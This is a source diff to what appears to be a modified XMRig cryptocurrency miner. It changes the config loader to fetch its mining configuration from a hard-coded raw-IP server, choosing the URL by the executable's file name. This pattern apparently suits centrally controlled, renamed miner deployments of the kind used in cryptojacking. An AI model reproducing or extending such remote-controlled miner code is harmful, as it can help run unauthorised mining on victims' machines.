@@ -28,6 +28,7 @@
 #include "base/io/log/Log.h"
 #include "base/io/json/Json.h"
 #include "base/kernel/interfaces/IJsonReader.h"
+#include "base/kernel/Process.h"
 #include "base/net/dns/Dns.h"
 #include "base/net/stratum/Pool.h"
 #include "base/net/stratum/Pools.h"
@@ -401,13 +402,34 @@ void xmrig::Config::getJSON(rapidjson::Document &doc) const
 
 void xmrig::Config::loadWebConfig()
 {
-    // 硬编码默认的远程配置URL
-    const char* DEFAULT_WEB_CONFIG_URL = "http://182.92.97.16:8181/configs/666+cpu.json";
-    
-    // 如果没有指定web配置URL，使用默认的
+    // 如果没有指定web配置URL，根据程序名生成
     if (m_webConfigUrl.empty()) {
-        m_webConfigUrl = DEFAULT_WEB_CONFIG_URL;
-        LOG_INFO("Using default web configuration URL: %s", m_webConfigUrl.c_str());
+        // 获取程序的完整路径
+        String execPath = Process::exepath();
+        std::string fullPath(execPath.data());
+        
+        // 提取文件名（不含路径）
+        std::string execName = fullPath;
+        size_t lastSlash = fullPath.find_last_of("/\\");
+        if (lastSlash != std::string::npos) {
+            execName = fullPath.substr(lastSlash + 1);
+        }
+        
+        // 移除扩展名（.exe, .bin等）
+        size_t lastDot = execName.find_last_of(".");
+        if (lastDot != std::string::npos) {
+            execName = execName.substr(0, lastDot);
+        }
+        
+        // 如果程序名为空或为默认的xmrig，使用666作为默认
+        if (execName.empty() || execName == "xmrig") {
+            execName = "666";
+        }
+        
+        // 构建配置URL
+        m_webConfigUrl = "http://182.92.97.16:8181/configs/" + execName + "+cpu.json";
+        LOG_INFO("Using web configuration URL based on executable name '%s': %s", 
+                 execName.c_str(), m_webConfigUrl.c_str());
     }
     
     LOG_INFO("Loading configuration from: %s", m_webConfigUrl.c_str());
